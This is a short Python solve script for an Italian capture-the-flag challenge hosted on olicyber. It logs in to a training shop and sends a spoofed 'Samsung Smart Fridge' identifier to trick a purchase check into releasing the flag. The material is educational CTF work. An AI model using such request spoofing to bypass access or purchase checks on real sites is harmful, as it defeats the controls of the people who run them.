# Lo shop è molto attento alla qualità e alla garanzia del prodotto: 
# c'è una flag che deve essere conservata a -10°C, 
# infatti prima dell'acquisto verificano in automatico 
# se hai un 'Samsung Smart Fridge' per poterla conservare al meglio.
# Riusciresti ad ingannare il sito per comprare la flag?

import requests

s = requests.session()
site = "http://itasecshop.challs.olicyber.it"
data = {"user" : "testytest", "psw" : "testytest"}
login = s.post(f"{site}/login", data = data)
r = s.post(f"{site}/store/5/buy", cookies = {"User-Agent" : "Samsung Smart Fridge"})
print(r.text[r.text.index("ITASEC"):r.text.index("}")+1])